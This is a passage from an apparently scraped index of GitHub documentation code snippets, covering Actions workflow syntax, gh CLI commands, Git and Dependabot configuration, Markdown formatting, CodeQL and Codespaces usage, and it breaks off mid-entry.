https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-bamboo-with-github-actions-importer.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer forecast bamboo --project PAN --output-dir tmp/forecast_reports\n```\n\n----------------------------------------\n\nTITLE: Trigger workflow on pull requests targeting specific branches (YAML)\nDESCRIPTION: This snippet demonstrates how to configure a GitHub Actions workflow to run only on pull requests that target branches whose names start with `releases/`. It uses the `branches` filter.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_24\n\nLANGUAGE: YAML\nCODE:\n```\non:\n  pull_request:\n    types:\n      - opened\n    branches:\n      - 'releases/**'\n```\n\n----------------------------------------\n\nTITLE: Trigger Workflow on Delete Event - YAML\nDESCRIPTION: This snippet configures a workflow to run when a Git reference (branch or tag) is deleted in the repository. It specifies the `delete` event. An event will not be created when you delete more than three tags at once.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  delete\n```\n\n----------------------------------------\n\nTITLE: Configuring npm registry in dependabot.yml\nDESCRIPTION: This snippet configures an npm registry in the `dependabot.yml` file. It specifies the registry type, URL, and token using a GitHub secret.  A personal access token is required for authentication.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/guidance-for-the-configuration-of-private-registries-for-dependabot.md#_snippet_8\n\nLANGUAGE: yaml\nCODE:\n```\nregistries:\n  npm-github:\n    type: npm-registry\n    url: https://npm.pkg.github.com\n    token: ${{secrets.MY_GITHUB_PERSONAL_TOKEN}}\n```\n\n----------------------------------------\n\nTITLE: Generating a Migration Script using gh-ado2gh\nDESCRIPTION: This command generates a migration script using the `gh ado2gh generate-script` command. It requires specifying the Azure DevOps organization, the GitHub organization, and the output filename for the script.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/migrating-from-azure-devops-to-github-enterprise-cloud/migrating-repositories-from-azure-devops-to-github-enterprise-cloud.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\ngh ado2gh generate-script --ado-org SOURCE --github-org DESTINATION --output FILENAME\n```\n\n----------------------------------------\n\nTITLE: Constructing a Search Query in JavaScript\nDESCRIPTION: This JavaScript code snippet demonstrates how to properly encode a search query string for use with the GitHub REST API. It uses the `encodeURIComponent` function to ensure that special characters are properly encoded.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/search/search.md#_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\n// JavaScript\nconst queryString = 'q=' + encodeURIComponent('GitHub Octocat in:readme user:defunkt');\n```\n\n----------------------------------------\n\nTITLE: Renaming a Codespace using GitHub CLI\nDESCRIPTION: This command renames a codespace. The `-c` flag specifies the name of the codespace, and the `-d` flag specifies the new display name. This allows users to easily identify and manage their codespaces.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/developing-in-a-codespace/using-github-codespaces-with-github-cli.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\ngh codespace edit -c CODESPACE-NAME -d 'DISPLAY-NAME'\n```\n\n----------------------------------------\n\nTITLE: Listing Docker images\nDESCRIPTION: This command lists the existing Docker images on the local system, displaying their repository, tag, image ID, creation date, and size. It helps identify the image to be tagged and published.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-docker-registry.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\n$ docker images\n> <&nbsp>\n> REPOSITORY        TAG        IMAGE ID       CREATED      SIZE\n> IMAGE_NAME        VERSION    IMAGE_ID       4 weeks ago  1.11MB\n```\n\n----------------------------------------\n\nTITLE: Prune Docker System - All Images\nDESCRIPTION: This command removes all unused Docker images, networks, and containers (including currently unused images) from the GitHub Codespaces environment. It reclaims maximum disk space occupied by Docker-related resources.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/troubleshooting/troubleshooting-creation-and-deletion-of-codespaces.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\ndocker system prune -a\n```\n\n----------------------------------------\n\nTITLE: Removing a cluster configuration section (ghe-config)\nDESCRIPTION: This command removes a section from the `cluster.conf` file for a specific node.  This helps keep the configuration file clean and organized. HOSTNAME should be replaced with the hostname of the removed node.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/replacing-a-cluster-node.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\nghe-config --remove-section \"cluster.HOSTNAME\"\n```\n\n----------------------------------------\n\nTITLE: Re-running a specific job with debug logging using gh CLI\nDESCRIPTION: This snippet demonstrates how to re-run a specific job with debug logging using the `gh run rerun` subcommand, the `--job` flag, and the `--debug` flag. `JOB_ID` should be replaced with the ID of the job.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/re-running-workflows-and-jobs.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\ngh run rerun --job JOB_ID --debug\n```\n\n----------------------------------------\n\nTITLE: Calling Workflow in Local Repository (Relative Path)\nDESCRIPTION: This snippet calls a workflow named 'workflow-2.yml' located in the '.github/workflows' directory of the current repository, using a relative path. This approach is used when the workflow resides in the same repository.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/uses-keyword-example.md#_snippet_1\n\nLANGUAGE: YAML\nCODE:\n```\njobs:\n  call-workflow-2-in-local-repo:\n    uses: ./.github/workflows/workflow-2.yml\n```\n\n----------------------------------------\n\nTITLE: Supported Color Models in Markdown\nDESCRIPTION: This snippet shows how to call out colors within a sentence using backticks and a supported color model (HEX, RGB, HSL). The color is then visualized in issues, pull requests, and discussions.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax.md#_snippet_4\n\nLANGUAGE: markdown\nCODE:\n```\nThe background color is `#ffffff` for light mode and `#000000` for dark mode.\n```\n\n----------------------------------------\n\nTITLE: Setting global Git username using git config\nDESCRIPTION: This code snippet sets the Git username globally using the `git config --global user.name` command. The username provided will be associated with all future commits made on the computer. It requires Git to be installed and configured.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/git-basics/setting-your-username-in-git.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngit config --global user.name \"Mona Lisa\"\n```\n\n----------------------------------------\n\nTITLE: Saving Files Before Refreshing Line Endings\nDESCRIPTION: This snippet saves any outstanding changes to files in the repository before refreshing line endings, to prevent data loss. It adds all modified files and commits them with a descriptive message.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/git-basics/configuring-git-to-handle-line-endings.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ngit add . -u\ngit commit -m \"Saving files before refreshing line endings\"\n```\n\n----------------------------------------\n\nTITLE: Markdown Table with Footnotes Example\nDESCRIPTION: Demonstrates the correct syntax for creating a table with footnotes in Markdown, including the table structure and the footnote definitions below the table.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/style-guide-and-content-model/style-guide.md#_snippet_10\n\nLANGUAGE: Markdown\nCODE:\n```\n| | Mona | Ursula | Paul | Davy Jones[^1] |\n|---|---|---|---|---|\n|Favorite pastime| Shipping code | Tricking mermaids[^2] | Predicting sports | Haunting seafarers |\n|Uses powers for good| Yes | No | Yes | No |\n[^1]: Not to be confused with Davy Jones of The Monkees\n[^2]: Also humans\n```\n\n----------------------------------------\n\nTITLE: Defining Extractor in qlpack.yml (YAML)\nDESCRIPTION: This snippet defines the CodeQL language extractor to use when running tests in the pack.  The `extractor` property specifies the language extractor, such as `javascript-typescript`. This is required for all packs containing CodeQL tests.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/publishing-and-using-codeql-packs.md#_snippet_15\n\nLANGUAGE: YAML\nCODE:\n```\nextractor: javascript-typescript\n```\n\n----------------------------------------\n\nTITLE: Running Command-Line Programs (YAML)\nDESCRIPTION: This YAML snippet shows how to execute shell commands directly within a GitHub Actions workflow using the `run` keyword. The snippet demonstrates both single-line and multi-line commands, executed within a non-login shell by default.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/workflow-syntax-for-github-actions.md#_snippet_18\n\nLANGUAGE: yaml\nCODE:\n```\n  - name: Install Dependencies\n    run: npm install\n```\n\nLANGUAGE: yaml\nCODE:\n```\n  - name: Clean install dependencies and build\n    run: |\n      npm ci\n      npm run build\n```\n\n----------------------------------------\n\nTITLE: Shell Command Example\nDESCRIPTION: This shell script snippet illustrates a longer and more complex command. It's used to enable maintenance mode for a cluster. The example avoids including command prompts like `$` to improve copy-paste usability.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/style-guide-and-content-model/style-guide.md#_snippet_8\n\nLANGUAGE: Shell\nCODE:\n```\nghe-cluster-maintenance -s\n```\n\n----------------------------------------\n\nTITLE: CodeQL CLI Pipeline Entrypoint Script\nDESCRIPTION: This script is the entrypoint for the CodeQL CLI pipeline. It generates Markdown files under the specified content directory.  The script likely depends on Pandoc for document conversion and uses the configuration file (`src/codeql-cli/lib/config.json`) to determine metadata.\nSOURCE: https://github.com/github/docs/blob/main/src/codeql-cli/README.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nsrc/codeql-cli/scripts/sync.js\n```\n\n----------------------------------------\n\nTITLE: Specifying Manual Build Commands (YAML)\nDESCRIPTION: This example shows how to define manual build commands within a `run` step in a CodeQL workflow. The commands provided (make bootstrap, make release) are specific to the project's build process.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/creating-an-advanced-setup-for-code-scanning/codeql-code-scanning-for-compiled-languages.md#_snippet_6\n\nLANGUAGE: YAML\nCODE:\n```\n- run: |\n    make bootstrap\n    make release\n```\n\n----------------------------------------\n\nTITLE: Searching by Number of Followers\nDESCRIPTION: This example demonstrates how to search for users based on the number of followers they have, using the `followers` qualifier along with comparison operators.  The qualifier can be used to find users with a certain number, or a range of followers.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/searching-on-github/searching-users.md#_snippet_6\n\nLANGUAGE: none\nCODE:\n```\nfollowers:>=1000\nsparkle followers:1..10\n```\n\n----------------------------------------\n\nTITLE: Configuring GitHub Actions Importer with Jenkins\nDESCRIPTION: This snippet shows how to configure the GitHub Actions Importer CLI with Jenkins, including selecting Jenkins as the CI provider and providing credentials for GitHub and Jenkins. It also includes setting the base URLs for both platforms.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-jenkins-with-github-actions-importer.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer configure\n```\n\n----------------------------------------\n\nTITLE: Running Playwright Tests with CI Configuration\nDESCRIPTION: This command runs Playwright tests with the CI environment variable set, which adjusts the default timeout and worker settings to simulate the CI environment. `CI=1` also defaults to using a single worker.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/PLAYWRIGHT.md#_snippet_12\n\nLANGUAGE: shell\nCODE:\n```\nCI=1 npm run playwright-test -- playwright-rendering\n```\n\n----------------------------------------\n\nTITLE: Create Page Tree in English\nDESCRIPTION: This snippet shows the location in the code where a tree of all possible pages is created based on English content. The tree structure is built by following the `children` properties defined in each `index.md` file.\nSOURCE: https://github.com/github/docs/blob/main/src/languages/README.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nsrc/frame/lib/page-data.js#L45-L47\n```\n\n----------------------------------------\n\nTITLE: Checking out submodules in GitHub Actions YAML\nDESCRIPTION: This snippet demonstrates how to disable submodule checkout in GitHub Actions using the `actions/checkout` action.  The `submodules` option is set to `false` within the `with` section of the action configuration.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-travis-ci-to-github-actions.md#_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\n- uses: {% data reusables.actions.action-checkout %}\n  with:\n    submodules: false\n```\n\n----------------------------------------\n\nTITLE: Workflow Trigger on Push - YAML\nDESCRIPTION: This snippet configures a GitHub Actions workflow to trigger whenever a push event occurs on any branch of the repository. The `on: push` configuration ensures that the workflow runs when code is pushed. This is a common way to initiate continuous integration processes.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/on-single-example.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\non: push\n```\n\n----------------------------------------\n\nTITLE: Adding file to Git repository in Shell\nDESCRIPTION: This snippet shows how to add a file to the Git repository using the `git add` command.  Replace 'path/to/file.psd' with the actual path to the file you want to add. This command stages the file for commit.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/working-with-files/managing-large-files/configuring-git-large-file-storage.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ngit add path/to/file.psd\n```\n\n----------------------------------------\n\nTITLE: Tool Tag: PowerShell\nDESCRIPTION: This code snippet demonstrates how to use the `powershell` tag to display content relevant to `pwsh` and `powershell` users. It wraps instructions specific to PowerShell.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/using-markdown-and-liquid-in-github-docs.md#_snippet_18\n\nLANGUAGE: text\nCODE:\n```\n{% raw %}{% powershell %}\n\nThese instructions are pertinent to `pwsh` and `powershell` commands.\n\n{% endpowershell %}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Tail GitHub Config Log (Shell)\nDESCRIPTION: This command allows for live monitoring of the GitHub Enterprise configuration log. By tailing the log file, administrators can observe the progress of the configuration application process, identifying potential issues or delays.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/upgrading-a-cluster.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\ntail -f /data/user/common/ghe-config.log\n```\n\n----------------------------------------\n\nTITLE: Configuring Git gpg.program locally\nDESCRIPTION: Configures Git's `gpg.program` to use `smimesign` for a single repository. This is applicable for Git versions 2.18 or earlier.  The `--local` flag ensures the configuration is specific to the current repository.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/gpg/x-509-key.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ncd  PATH-TO-REPOSITORY\ngit config --local gpg.program smimesign\n```\n\n----------------------------------------\n\nTITLE: Enabling a Workflow using GitHub CLI\nDESCRIPTION: This snippet demonstrates how to enable a disabled GitHub workflow using the `gh workflow enable` command. Replace `WORKFLOW` with the name, ID, or filename of the workflow. If no workflow is specified, the CLI will present an interactive menu to select a workflow.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/disabling-and-enabling-a-workflow.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ngh workflow enable WORKFLOW\n```\n\n----------------------------------------\n\nTITLE: Documented COBOL Database Insertion\nDESCRIPTION: This is the documented version of the COBOL code that inserts a person record into the database. The documentation provides comments to explain the purpose of each section of the code, the meaning of variables, and the logic behind the database insertion process.  It uses embedded SQL for database interactions. Input is taken via `LS-PERSON-RECORD` in the `LINKAGE SECTION`.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/documenting-code/documenting-legacy-code.md#_snippet_1\n\nLANGUAGE: cobol\nCODE:\n```\n*****************************************************************\n* Program: INSERT-RECORD\n* Purpose: Inserts a person record into the database with\n*          transaction management and error handling\n*****************************************************************\n IDENTIFICATION DIVISION.\n PROGRAM-ID. INSERT-RECORD.\n\n ENVIRONMENT DIVISION.\n\n DATA DIVISION.\n WORKING-STORAGE SECTION.\n* Status flags and error handling variables\n 01  WS-STATUS-FLAGS.\n     05 WS-DB-STATUS     PIC X(2).              *> Database status\n        88 WS-SUCCESS    VALUE \"00\".            *> Success flag\n     05 WS-SQLCODE       PIC S9(9) COMP.        *> SQL return code\n     05 WS-ERROR-MSG     PIC X(50).             *> Error message\n\n LINKAGE SECTION.\n* Input/Output parameters\n 01  LS-PARAMETERS.\n     05 LS-PERSON-RECORD.\n        10 PERSON-ID     PIC 9(6).              *> Person ID\n        10 PERSON-NAME   PIC X(50).             *> Person name\n        10 PERSON-AGE    PIC 9(3).              *> Person age\n     05 LS-RESULT        PIC X.                 *> Operation result\n        88 SUCCESS       VALUE 'T'.             *> Success flag\n        88 FAILED        VALUE 'F'.             *> Failure flag\n\n PROCEDURE DIVISION USING LS-PARAMETERS.\n     PERFORM INSERT-AND-VALIDATE\n     GOBACK\n     .\n\n*****************************************************************\n* Handles database insertion with transaction management\n*****************************************************************\n INSERT-AND-VALIDATE.\n     EXEC SQL\n         INSERT INTO persons (id, name, age)\n         VALUES (:PERSON-ID, :PERSON-NAME, :PERSON-AGE)\n     END-EXEC\n\n     IF SQLCODE = 0\n         EXEC SQL COMMIT END-EXEC                *> Commit if successful\n         SET SUCCESS TO TRUE\n     ELSE\n         EXEC SQL ROLLBACK END-EXEC              *> Rollback if failed\n         SET FAILED TO TRUE\n         STRING \"DB Error: \" SQLCODE\n             DELIMITED BY SIZE\n             INTO WS-ERROR-MSG\n         DISPLAY WS-ERROR-MSG\n     END-IF\n     .\n```\n\n----------------------------------------\n\nTITLE: Download Migration Archive with GET Request (Shell)\nDESCRIPTION: This snippet demonstrates how to download a migration archive using a GET request to the GitHub Migrations API. It requires an access token for authentication and the unique ID of the migration. The `-L` option follows redirects, and `-o` specifies the output filename for the downloaded archive.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-ghe-migrator/exporting-migration-data-from-githubcom.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ncurl -H \"Authorization: Bearer GITHUB_ACCESS_TOKEN\" \\\n-H \"Accept: application/vnd.github+json\" \\\n-L -o migration_archive.tar.gz \\\nhttps://api.github.com/orgs/ORG_NAME/migrations/ID/archive\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_PROJECT_ID to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_PROJECT_ID` to the GitHub Actions equivalent `${{ github.repository }}`. The `${{ github.repository }}` represents the GitHub repository name.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_37\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.repository }}\n```\n\n----------------------------------------\n\nTITLE: Conditional Link to Partner Program (Liquid)\nDESCRIPTION: This snippet uses Liquid templating to conditionally render a link to the secret scanning partner program documentation. It checks if the version is FPT or GHEC. If true, it uses a shorter link. Otherwise, it uses a longer link to the enterprise cloud documentation.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/secret-scanning/partner-program-link.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n{% ifversion fpt or ghec %}\nTo find out about our partner program, see [AUTOTITLE](/code-security/secret-scanning/secret-scanning-partnership-program/secret-scanning-partner-program).\n{% else %}\nTo find out about our partner program, see [AUTOTITLE](/enterprise-cloud@latest/code-security/secret-scanning/secret-scanning-partnership-program/secret-scanning-partner-program) in the {% data variables.product.prodname_ghe_cloud %} documentation.\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Dry run of Bitbucket pipeline to GitHub Actions conversion\nDESCRIPTION: This command performs a dry run of the Bitbucket pipeline to GitHub Actions conversion, allowing inspection of the converted workflow files without creating a pull request. It uses the `--source-file-path` argument to specify the Bitbucket pipeline file, instead of fetching it from the Bitbucket instance. The output is stored in the specified output directory.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-bitbucket-pipelines-with-github-actions-importer.md#_snippet_11\n\nLANGUAGE: bash\nCODE:\n```\ngh actions-importer dry-run bitbucket --workspace :workspace --repository :repo --output-dir tmp/dry-run --source-file-path path/to/my/pipeline/file.yml\n```\n\n----------------------------------------\n\nTITLE: C++ XML Doc Comments Configuration\nDESCRIPTION: This configuration snippet details how to enable XML documentation comments for C++ in Visual Studio. It walks through the steps to select 'Xml Doc Comments' style in the Visual Studio settings, and to configure insertion and continuation options for comments.  No external dependencies are required; this is a configuration process within Visual Studio.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/getting-code-suggestions-in-your-ide-with-github-copilot.md#_snippet_6\n\n\n\n----------------------------------------\n\nTITLE: Verifying jq installation\nDESCRIPTION: This snippet verifies that `jq` is installed correctly by running the command `jq --version`. Successful installation will produce output similar to `jq-1.6`. This is a prerequisite for parsing JSON output from `git-sizer`.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/overview/planning-your-migration-to-github.md#_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\njq –-version\n```\n\n----------------------------------------\n\nTITLE: Remove version markup using npm script\nDESCRIPTION: This command utilizes an npm script to remove version-specific markup from the codebase. It requires the '--release' flag to specify the version number to be removed. This automates the removal of outdated Liquid markup and frontmatter.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/lib/deprecation-steps.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nnpm run remove-version-markup -- --release <number>\n```\n\n----------------------------------------\n\nTITLE: Calling a Reusable Workflow\nDESCRIPTION: This YAML snippet demonstrates how to call another reusable workflow from within a reusable workflow. The `uses` keyword specifies the repository, workflow file path, and version of the reusable workflow to call.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/reusing-workflows.md#_snippet_6\n\nLANGUAGE: YAML\nCODE:\n```\nname: Reusable workflow\n\non:\n  workflow_call:\n\njobs:\n  call-another-reusable:\n    uses: octo-org/example-repo/.github/workflows/another-reusable.yml@v1\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_COMMIT_TAG to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_COMMIT_TAG` to the GitHub Actions equivalent `${{ github.ref }}`. The tag name is used via the `ref` context.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_22\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.ref }}\n```\n\n----------------------------------------\n\nTITLE: Configuring VS Code Devcontainer Extensions (JSONC)\nDESCRIPTION: This snippet shows how to configure the `devcontainer.json` file to automatically install the \"Code Spell Checker\" VS Code extension when the container is created. The `customizations.vscode.extensions` property is used to specify the list of extensions to install, using their IDs. The JSONC format allows comments.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/codespaces/add-extension-to-devcontainer.md#_snippet_0\n\nLANGUAGE: jsonc\nCODE:\n```\n// Configure tool-specific properties.\n\"customizations\": {\n  // Configure properties specific to VS Code.\n  \"vscode\": {\n    // Add the IDs of extensions you want installed when the container is created.\n    \"extensions\": [\n      \"streetsidesoftware.code-spell-checker\"\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Markdown Caution Alert\nDESCRIPTION: This snippet illustrates how to create a 'Caution' alert box in Markdown. The `[!CAUTION]` syntax is used to highlight potentially dangerous situations or practices that require extra care. This alert type is used to emphasize precautions.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/fixtures/content/get-started/markdown/alerts.md#_snippet_4\n\nLANGUAGE: Markdown\nCODE:\n```\n> [!CAUTION]\n> Be careful!\n```\n\n----------------------------------------\n\nTITLE: Creating Unordered Lists in Markdown\nDESCRIPTION: Shows how to create unordered lists using '-', '*', or '+' as list markers. The snippet demonstrates a basic unordered list with three items.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax.md#_snippet_9\n\nLANGUAGE: markdown\nCODE:\n```\n- George Washington\n* John Adams\n+ Thomas Jefferson\n```\n\n----------------------------------------\n\nTITLE: Updating Main Function in Ruby\nDESCRIPTION: This snippet updates the `main` function to call the `login` function when the command-line argument is `login`. It also includes cases for `help` and `whoami`, with a default case for unknown commands.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-a-cli-with-a-github-app.md#_snippet_13\n\nLANGUAGE: ruby\nCODE:\n```\ndef main\n  case ARGV[0]\n  when \"help\"\n    help\n  when \"login\"\n    login\n  when \"whoami\"\n    puts \"`whoami` is not yet defined\"\n  else\n    puts \"Unknown command #{ARGV[0]}\"\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Creating CodeQL Database Bundle using CLI\nDESCRIPTION: This command creates a CodeQL database bundle for troubleshooting. It includes diagnostics, logs, and results in a zip file.  Requires CodeQL CLI version 2.11.3 or higher. The <dir> should be the path to the CodeQL database directory.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/creating-database-bundle-for-troubleshooting.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql database bundle --output=codeql-debug-artifacts.zip --include-diagnostics --include-logs --include-results -- <dir>\n```\n\n----------------------------------------\n\nTITLE: Including Queries by Kind OR Precision - YAML\nDESCRIPTION: This example selects queries that are either of `kind: problem` or of `precision: very-high`.  Queries satisfying either criteria will be added to the suite.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/creating-codeql-query-suites.md#_snippet_9\n\nLANGUAGE: yaml\nCODE:\n```\n- queries: my-custom-queries\n- include:\n    kind: problem\n- include:\n    precision: very-high\n```\n\n----------------------------------------\n\nTITLE: HTML Table with Fixed Layout CSS\nDESCRIPTION: This HTML code snippet shows an example of an HTML table with the `table-layout: fixed;` CSS style applied. This is used to prevent tables containing code blocks from overflowing the page content.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/using-markdown-and-liquid-in-github-docs.md#_snippet_24\n\nLANGUAGE: html\nCODE:\n```\n<table style=\"table-layout: fixed;\">\n```\n\n----------------------------------------\n\nTITLE: Using GITHUB_TOKEN in {% data variables.product.prodname_actions %} workflow\nDESCRIPTION: This YAML snippet demonstrates how to store the `GITHUB_TOKEN` as an environment variable in a {% data variables.product.prodname_actions %} workflow.  The token is stored in the `TOKEN` environment variable.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/scripting-with-the-rest-api-and-javascript.md#_snippet_2\n\nLANGUAGE: YAML\nCODE:\n```\n- name: Run script\n  env:\n    TOKEN: {% raw %}${{ secrets.GITHUB_TOKEN }}{% endraw %}\n  run: |\n    node .github/actions-scripts/use-the-api.mjs\n```\n\n----------------------------------------\n\nTITLE: Displaying runner service user with systemctl\nDESCRIPTION: This command uses `systemctl` to display the user account that the self-hosted runner service is running under on Linux. It's used to identify the service account that needs Docker permissions. Requires `sudo` privileges.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners/monitoring-and-troubleshooting-self-hosted-runners.md#_snippet_13\n\nLANGUAGE: shell\nCODE:\n```\n$ sudo systemctl show -p User actions.runner.octo-org-octo-repo.runner01.service\n```\n\n----------------------------------------\n\nTITLE: Deleting a codespace interactively with GitHub CLI\nDESCRIPTION: This snippet shows how to delete a codespace interactively using the GitHub CLI. It prompts the user to select a codespace from a list. If there are unsaved changes, the user will be prompted to confirm the deletion unless the `--force` flag is used.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/developing-in-a-codespace/deleting-a-codespace.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngh codespace delete\n```\n\n----------------------------------------\n\nTITLE: Redux Store Configuration\nDESCRIPTION: This code configures a Redux store using the `createStore` function from the `redux` library. It imports the `counterReducer` and uses it to create the store, which manages the application's state.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/refactoring-code/decoupling-business-logic-from-ui-components.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nimport { createStore } from 'redux';\nimport counterReducer from './reducer';\n\nconst store = createStore(counterReducer);\n\nexport default store;\n```\n\n----------------------------------------\n\nTITLE: Creating a Migration Source using GraphQL Mutation\nDESCRIPTION: This GraphQL mutation creates a migration source, specifying the name, URL, owner ID, and type of the source (Azure DevOps). The mutation returns the ID, name, URL, and type of the newly created migration source.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/migrating-from-azure-devops-to-github-enterprise-cloud/migrating-repositories-from-azure-devops-to-github-enterprise-cloud.md#_snippet_0\n\nLANGUAGE: graphql\nCODE:\n```\nmutation createMigrationSource($name: String!, $ownerId: ID!) {\n  createMigrationSource(input: {name: $name, url: \"https://dev.azure.com\", ownerId: $ownerId, type: AZURE_DEVOPS}) {\n    migrationSource {\n      id\n      name\n      url\n      type\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Markdown Tip Alert Formatting\nDESCRIPTION: This snippet shows the Markdown syntax for creating a 'Tip' alert in GitHub documentation. It involves using a blockquote with the '[!TIP]' label to indicate a recommendation, best practice, or product hint for the user.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/style-guide-and-content-model/style-guide.md#_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n> [!TIP]\n> Here's a suggestion.\n```\n\n----------------------------------------\n\nTITLE: Accessing Codespace Logs with GitHub CLI\nDESCRIPTION: This command retrieves the creation log for a specified codespace using the GitHub CLI.  The user will be prompted for their SSH key passphrase.  Replace `CODESPACE-NAME` with the actual name of the codespace.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/developing-in-a-codespace/using-github-codespaces-with-github-cli.md#_snippet_13\n\nLANGUAGE: shell\nCODE:\n```\ngh codespace logs -c 